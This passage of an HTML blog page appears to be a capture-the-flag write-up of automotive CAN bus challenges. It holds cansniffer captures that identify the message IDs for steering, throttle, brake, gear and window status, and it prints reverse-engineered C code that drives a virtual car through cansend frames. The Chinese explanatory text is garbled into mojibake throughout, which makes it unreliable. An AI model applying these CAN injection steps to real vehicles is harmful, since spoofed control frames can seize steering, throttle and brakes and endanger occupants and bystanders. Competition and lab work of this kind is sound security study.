†ä¼ä¸šé‡Œæ€åˆ°å•é¡¹ç¬¬äº”</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110120340616.png" alt="image-20250110120340616"></p><h2 id="åº•ç›˜åŸŸ"><a href="#åº•ç›˜åŸŸ" class="headerlink" title="åº•ç›˜åŸŸ"></a>åº•ç›˜åŸŸ</h2><h3 id="åº•ç›˜åŸŸçŠ¶æ€æŠ¥æ–‡IDè·å–"><a href="#åº•ç›˜åŸŸçŠ¶æ€æŠ¥æ–‡IDè·å–" class="headerlink" title="åº•ç›˜åŸŸçŠ¶æ€æŠ¥æ–‡IDè·å–"></a>åº•ç›˜åŸŸçŠ¶æ€æŠ¥æ–‡IDè·å–</h3><p>ä½¿ç”¨ cansniffer æŠ“åŒ…ï¼Œæ³¨æ„æ§åˆ¶è½¦è¾†çš„webç«¯çš„ ws æµè¦ä¿æŒè¿æ¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cansniffer <span class="token parameter variable">-c</span> can0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…ˆæµ‹æ–¹å‘ç›˜ï¼Œç¼“ç¼“è°ƒæ•´æ–¹å‘ç›˜è§’åº¦</p><p>åŒæ—¶è§‚å¯ŸæŠ“åŒ…æƒ…å†µ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">25</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  31F  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">5.384565</span>  <span class="token number">401</span>  00 01 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">30</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.038971</span>  <span class="token number">401</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">38</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">0.413291</span>  <span class="token number">401</span>  FF F7 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">43</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">9.999999</span>  2F7  9A <span class="token number">99</span> <span class="token number">59</span> 3F 00 00 00 00 <span class="token punctuation">..</span>Y?<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">401</span>  FF F7 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">62</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F7  9A <span class="token number">99</span> <span class="token number">59</span> 3F 00 00 00 00 <span class="token punctuation">..</span>Y?<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.590077</span>  <span class="token number">401</span>  FF F0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">77</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  <span class="token number">401</span>  FF F0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">81</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">9.999999</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">401</span>  FF F0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">82</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">99</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.328627</span>  <span class="token number">401</span>  FF E3 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆå¯ä»¥çŒœæµ‹å’Œæ–¹å‘ç›˜æœ‰å…³çš„æŠ¥æ–‡IDä¸º401</p><p>åŒç†æµ‹æ²¹é—¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">33</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  <span class="token number">105</span>  00 <span class="token number">40</span> 00 00 00 00 00 00 .@<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.072732</span>  <span class="token number">204</span>  <span class="token number">22</span> 00 00 00 00 00 00 00 <span class="token string">".......0.000000  2F6  0A 00 00 00 00 00 00 00 ........0.000000  30F  03 E6 00 00 00 00 00 00 ........0.000000  314  00 40 00 00 00 00 00 00 .@......7.018217  315  00 10 00 00 00 00 00 00 ........7.020064  32F  00 01 00 00 00 00 00 00 ........0.050987  402  22 00 00 00 00 00 00 00 "</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">49</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>^C008977  <span class="token number">105</span>  01 <span class="token number">28</span> 00 00 00 00 00 00 .<span class="token punctuation">(</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.187966</span>  <span class="token number">204</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">2.005456</span>  30F  03 E4 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.003900</span>  <span class="token number">314</span>  01 <span class="token number">28</span> 00 00 00 00 00 00 .<span class="token punctuation">(</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.999780</span>  <span class="token number">315</span>  00 2B 00 00 00 00 00 00 .+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.004486</span>  31F  00 05 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.998573</span>  32F  00 08 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.059475</span>  <span class="token number">402</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠ¥æ–‡IDä¸º402</p><p>åˆ¹è½¦ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">29</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">1.003801</span>  <span class="token number">105</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.245428</span>  <span class="token number">205</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">1.007777</span>  30F  03 B0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.003799</span>  <span class="token number">314</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">7.006076</span>  <span class="token number">315</span>  01 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.007778</span>  31F  00 6D 00 00 00 00 00 00 .m<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.003865</span>  32F  00 A4 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.067160</span>  <span class="token number">403</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">31</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>^C000000  <span class="token number">105</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">205</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token number">0.000000</span>  30F  03 B0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">314</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">315</span>  01 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  31F  00 6D 00 00 00 00 00 00 .m<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  32F  00 A4 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">403</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠ¥æ–‡IDä¸º403</p><p>æ¡£ä½ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">21</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  <span class="token number">105</span>  00 B3 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  2F3  B8 0B 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.000811</span>  30F  03 <span class="token number">72</span> 00 00 00 00 00 00 .r<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">314</span>  00 B3 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">315</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.001970</span>  31F  00 E9 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.001312</span>  32F  01 5E 00 00 00 00 00 00 .^<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">404</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">24</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>^C000000  2F3  B8 0B 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">9.999999</span>  2F7  9A <span class="token number">99</span> <span class="token number">59</span> 3F 00 00 00 00 <span class="token punctuation">..</span>Y?<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  30F  03 <span class="token number">72</span> 00 00 00 00 00 00 .r<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">315</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  31F  00 E9 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  32F  01 5E 00 00 00 00 00 00 .^<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">404</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠ¥æ–‡IDä¸º404</p><p>flagï¼š<code>dk_flag&#123;401_402_403_404&#125;</code></p><hr><h2 id="è‡ªåŠ¨é©¾é©¶åŸŸ"><a href="#è‡ªåŠ¨é©¾é©¶åŸŸ" class="headerlink" title="è‡ªåŠ¨é©¾é©¶åŸŸ"></a>è‡ªåŠ¨é©¾é©¶åŸŸ</h2><h3 id="è‡ªåŠ¨é©¾é©¶é€»è¾‘ç ´è§£"><a href="#è‡ªåŠ¨é©¾é©¶é€»è¾‘ç ´è§£" class="headerlink" title="è‡ªåŠ¨é©¾é©¶é€»è¾‘ç ´è§£"></a>è‡ªåŠ¨é©¾é©¶é€»è¾‘ç ´è§£</h3><p>é€†å‘å‡ºæ¥çš„æ ¸å¿ƒé€»è¾‘ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 404#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v4 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æŒ‚1æ¡£</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 402#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v5 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è¸©æ²¹é—¨åˆ°40åº¦</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 404#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æŒ‚2æ¡£</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 402#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v7 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è¸©æ²¹é—¨åˆ°50åº¦</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 401#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v8 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v8<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å·¦è½¬30åº¦</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 402#00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ¾å¼€æ²¹é—¨</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 403#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v9 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v9<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è¸©åˆ¹è½¦åˆ°70åº¦</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">receive_can_message</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token number">789</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 404#00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æŒ‚Næ¡£</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 403#00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ¾å¼€åˆ¹è½¦</span><span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡ªåŠ¨é©¾é©¶é€»è¾‘ï¼šå…ˆæŒ‚1æ¡£èµ·æ­¥ï¼Œè¸©æ²¹é—¨åˆ°40åº¦ï¼Œè½¦é€Ÿ 27km&#x2F;h å·¦å³ï¼›ç„¶åæŒ‚2æ¡£ï¼Œè½¦é€Ÿ 35km&#x2F;h å·¦å³ï¼Œè¸©æ²¹é—¨åˆ°50åº¦ï¼Œè½¦é€Ÿ 14km&#x2F;h å·¦å³ï¼›æ¥ä¸‹æ¥æ–¹å‘ç›˜å·¦è½¬30åº¦ï¼Œè½¦é€Ÿ 9km&#x2F;h å·¦å³ï¼Œæ¾å¼€æ²¹é—¨ï¼›è¸©åˆ¹è½¦åˆ°70åº¦ï¼ŒæŒ‚Næ¡£ï¼Œç„¶åæ¾å¼€åˆ¹è½¦ï¼Œåœè½¦</p><hr><h2 id="è½¦èº«åŸŸ"><a href="#è½¦èº«åŸŸ" class="headerlink" title="è½¦èº«åŸŸ"></a>è½¦èº«åŸŸ</h2><h3 id="è½¦çª—æŠ¥æ–‡è·å–"><a href="#è½¦çª—æŠ¥æ–‡è·å–" class="headerlink" title="è½¦çª—æŠ¥æ–‡è·å–"></a>è½¦çª—æŠ¥æ–‡è·å–</h3><blockquote><p>æ“ä½œè™šæ‹Ÿè½¦è¾†ï¼Œå°è¯•è·å–è½¦çª—çŠ¶æ€æŠ¥æ–‡IDï¼ˆä¾‹å¦‚è½¦çª—çš„çŠ¶æ€æŠ¥æ–‡IDä¸º0x123ï¼Œåˆ™æäº¤123ï¼‰ï¼Œæäº¤åˆ°å¹³å°ï¼ˆæ ¼å¼:dk_flag{åå…­è¿›åˆ¶æ¶ˆæ¯ID}ï¼‰ã€‚</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">83</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>   <span class="token number">91</span>  00 <span class="token number">64</span> <span class="token number">64</span> <span class="token number">64</span> 00 00 00 00 .ddd<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">87</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">3.572785</span>   <span class="token number">91</span>  00 <span class="token number">64</span> <span class="token number">46</span> <span class="token number">64</span> 00 00 00 00 .dFd<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">9.999999</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>06 delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">2.231212</span>   <span class="token number">91</span>  00 <span class="token number">64</span> 1E <span class="token number">64</span> 00 00 00 00 .d.d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">80</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>   <span class="token number">91</span>  00 00 00 <span class="token number">64</span> 00 00 00 00 <span class="token punctuation">..</span>.d<span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flagï¼š<code>dk_flag&#123;091&#125;</code></p><h3 id="è½¦çª—æ§åˆ¶"><a href="#è½¦çª—æ§åˆ¶" class="headerlink" 